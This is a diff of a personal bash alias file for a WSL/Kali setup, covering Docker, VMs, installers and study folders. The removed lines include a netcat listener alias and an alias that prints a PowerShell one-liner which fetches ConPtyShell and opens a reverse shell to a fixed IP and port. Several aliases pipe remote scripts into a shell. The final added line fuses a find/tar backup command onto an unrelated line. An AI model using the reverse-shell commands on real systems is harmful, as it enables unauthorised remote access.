@@ -144,36 +144,17 @@ export DISPLAY=$(awk '/nameserver / {print $2; exit}' /etc/resolv.conf 2>/dev/nu
 
 # Docker containers aliases
 alias whisper='docker run -v /mnt/c/:/c/ -it michadockermisha/backup:whisper bash'
-alias st='docker run -v /mnt/c/:/c/ -it --name study michadockermisha/backup:study'
-alias pushwh='docker push michadockermisha/backup:whisper'
 alias startwh='docker start -ai whisper'
 alias portainer='docker pull michadockermisha/backup:portainer && docker run -d -p 9000:9000 --name portainer --restart always -v /var/run/docker.sock:/var/run/docker.sock michadockermisha/backup:portainer && ff localhost:9000'
-alias runhosts=' docker run -v /mnt/c/:/c/ -it -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --ip 172.17.0.2 --name ubuntu -d michadockermisha/backup:ubuntu /bin/bash -c "service ssh start && tail -f /dev/null" && docker run -v /mnt/c/:/c/ -it -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --ip 172.17.0.3 --name fedora -d michadockermisha/backup:fedora /bin/bash -c "/usr/sbin/sshd && tail -f /dev/null" &&  docker run -v /mnt/c/:/c/ -it -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --ip 172.17.0.4 --name kali -d michadockermisha/backup:kali /bin/bash -c "service ssh start && tail -f /dev/null" && docker run -v /mnt/c/:/c/ -it -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --ip 172.17.0.5 --name debian -d michadockermisha/backup:debian /bin/bash -c "service ssh start && tail -f /dev/null" && docker run -v /mnt/c/:/c/ -it -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --ip 172.17.0.6 --name opensuse -d michadockermisha/backup:opensuse /bin/bash -c "/usr/sbin/sshd && tail -f /dev/null" '
 
-alias kraken='drun gitkraken michadockermisha/backup:gitkraken sh -c "apk add rsync && rsync -aP /home/* /c/kraken && exit" && cd /mnt/c/kraken/ && cmd.exe /c "gitkraken.exe"'
-
-alias krak=' cd /mnt/c/kraken/ && cmd.exe /c "gitkraken.exe"'
 
 alias dcode='docker login && cc && docker run -v /mnt/c/:/c/ -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix -it --rm --name my_container michadockermisha/backup:python bash -c "echo 'y' | code --no-sandbox --user-data-dir=~/vscode-data && bash"'
-
-alias savehosts='docker commit b541bfc8a1e1 michadockermisha/backup:opensuse && \
-docker push michadockermisha/backup:opensuse && \
-docker commit c4f47b0680ca michadockermisha/backup:debian && \
-docker push michadockermisha/backup:debian && \
-docker commit 0adc7d163c34 michadockermisha/backup:kali && \
-docker push michadockermisha/backup:kali && \
-docker commit 50db59e77e31 michadockermisha/backup:fedora && \
-docker push michadockermisha/backup:fedora && \
-docker commit e5403a943324 michadockermisha/backup:ubuntu && \
-docker push michadockermisha/backup:ubuntu'
 
 # Docker general aliases
 alias ds='docker search'
 alias dstart='sudo service docker start'
-alias dai='docker start -ai'
 alias dps='docker ps --size'
 alias dpsa='docker ps -a --size'
-alias dim='docker images'
 alias built='docker build -t'
 alias dpush='docker push'
 alias start='docker start -ai'
@@ -214,22 +195,9 @@ alias os='cat /etc/os-release'
 alias cpbash='sudo cp /root/.bashrc /home/kali/.bashrc'
 
 
-
 # networking
 alias myip="hostname -I | cut -d' ' -f1"
 alias gatway="netstat -rn | grep '^0.0.0.0'"
-
-
-# VMS
-alias server='cmd.exe /c "C:\Program Files (x86)\VMware\VMware Workstation\vmrun.exe" -T ws start "C:\windowserver22\vmware\windowserver22\windowserver22.vmx"'
-alias win='cmd.exe /c ""C:\Program Files (x86)\VMware\VMware Workstation\vmrun.exe" -T ws start "C:\windows11vm\windows11.vmx"'
-alias vmkey='cat /mnt/c/backup/windowsapps/install/vmware/key.txt'
-
-
-##natcat
-alias nc='stty raw -echo; (stty size; cat) | nc -lvnp 3001'
-alias ncwinserv='cat " IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.17.211.249 3001"'
-
 alias ssk='ssh-keygen -t rsa -b 2048 && ssh-copy-id'
 
 #CD aliases
@@ -243,8 +211,6 @@ alias cdlinux='cd /mnt/c/backup/linux'
 alias downloads='cd /mnt/c/Users/micha/Downloads'
 alias pfiles="c && cd 'Program Files'"
 alias wapps='pfiles && cd WindowsApps'
-
-
 
 #CD STUDY
 alias sai='cd /mnt/c/study/AI'
@@ -271,7 +237,7 @@ alias smetasploit='cd /mnt/c/study/metasploit'
 alias snmap='cd /mnt/c/study/nmap&wireshark'
 alias sreverse='cd /mnt/c/study/reverseSHELL'
 alias swindows='cd /mnt/c/study/windows'
-alias sproxmox=" cd /mnt/c/study/virtualmachines/proxmox"
+alias sproxmox="/mnt/c/study/virtualmachines/proxmox"
 
 #ANSIBLE
 alias cda='cd /mnt/c/study/ansible/etc/ansible'
@@ -297,7 +263,6 @@ alias gdesk='cmd C:/Users/micha/AppData/Local/GitHubDesktop/GitHubDesktop.exe'
 
 #ECHO
 
-alias choco="echo 'Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))'"
 alias fkali='echo "wsl --unregister kali-linux;  wsl --import kali-linux C:\wsl2 C:\backup\linux\wsl\kalifull.tar; wsl"'
 alias backupw='echo '\''wsl --export kali-linux C:\backup\linux\kalicurrent.tar'\'''
 alias wupdates='cat "/mnt/c/study/powershell/scripts/windowsupdates.ps1" && cp "/mnt/c/study/powershell/scripts/windowsupdates.ps1 /mnt/c/users/micha/updates.ps1"'
@@ -310,10 +275,10 @@ alias errors='cat /mnt/c/study/bash/scripts/fixwindowserrors.sh && cp /mnt/c/stu
 #installations
 alias getsnap='sudo apt install snapd -y && updates && systemctl enable --now snapd.apparmor'
 alias getdocker='sudo apt update -y && sudo apt upgrade -y && \
-  sudo apt install -y -qq docker.io kubectl kubernetes-client && \
+  sudo apt install -y -qq docker.io && \
   sudo usermod -aG docker $USER && newgrp docker && sudo service docker start && \
   sudo apt install -y -qq docker.io && sudo usermod -aG docker $USER && \
-  newgrp docker && sudo service docker start && sudo sh -c "sudo setfacl -m user:$USER:rw /var/run/docker.sock && updates'
+ newgrp docker && sudo service docker start && sudo sh -c "sudo setfacl -m user:$USER:rw /var/run/docker.sock && updates'
 alias getpython='sudo apt install -y -qq python3 python3-pip pyinstaller && \
   sudo apt update -y && sudo apt upgrade -y && \
   sudo apt install -y -qq sshpass && sudo apt autoremove -y -qq'
@@ -333,17 +298,14 @@ alias getext='apt install tesseract-ocr -y'
 alias text=tesseract
 
 alias getcode='curl -fsSL https://code-server.dev/install.sh | sh'
-alias csrun='code-server'
-alias cs='ff localhost:8080'
 
 # Install basic tools and dependencies
-alias basicinstall='sudo apt install -y -qq wireless-tools rsync abiword tesseract-ocr gh pv speedtest-cli kali-win-kex \
+alias basicinstall='sudo apt install -y -qq wireless-tools rsync gh pv speedtest-cli kali-win-kex \
 net-tools gedit thonny kali-desktop-xfce curl wget ansible-core jq libgtk-3-dev libcurl4-openssl-dev -y'
 
 # Install SSH
 alias getssh='sudo apt install -y -qq openssh-server && sudo service ssh start && \
 sudo apt install -y -qq sshpass'
-
 
 ##tgpt  (-i, -c )
 alias getgpt='curl -sSL https://raw.githubusercontent.com/aandrew-me/tgpt/main/install | bash -s /usr/local/bin'
@@ -352,9 +314,9 @@ alias ask='tgpt'
 alias m='tgpt -m'
 
 # Full installation sequence
-alias full='updates && getgpt && getgoogler && basicinstall && getssh && getdocker && getpython && updates'
+alias full='updates && basicinstall && getssh && getdocker && updates'
 
-  
+
 export DOCKER_BUILDKIT=1
 export PATH="${KREW_ROOT:-$HOME/.krew}/bin:$PATH"
 
@@ -405,9 +367,6 @@ alias qb='cmd.exe /c "C:\Program Files\qBittorrent\qbittorrent.exe"'
 alias vs="cmd.exe /c C:/Users/micha/AppData/Roaming/Microsoft/Windows/'Start Menu'/Programs/'Visual Studio Code'/'Visual Studio Code.lnk'"
 alias drivers='cmd.exe /c "C:\Program Files\NVIDIA Corporation\NVIDIA GeForce Experience\NVIDIA GeForce Experience.exe"'
 alias mstore='pfiles && cd WindowsApps && cd Microsoft.WindowsStore_22310.1401.8.0_x64__8wekyb3d8bbwe && cmd.exe /c "WinStore.App.exe"'
-alias gears='cd /mnt/c/games/gears5/geargame/binaries/steam && cmd Gears5.exe'
-
-
 
 #EXPORT
 export PATH=$PATH:/snap/bin
@@ -472,4 +431,5 @@ alias cpalias='cp /mnt/c/backup/linux/wsl/alias.txt /root/.bashrc && cp /mnt/c/b
 
 alias cmd='cmd.exe /c'
 
-complete -C /mnt/c/Users/micha/mc mc
+complete -C /mnt/c/Users/micha/mc mcfind /var/lib/vz/images/ -type f \( -name '*.raw' -o -name '*.iso' \) -exec tar czvf /backup/proxmox_backup.tar.gz --directory=/var/lib/vz/images/ {} +
+
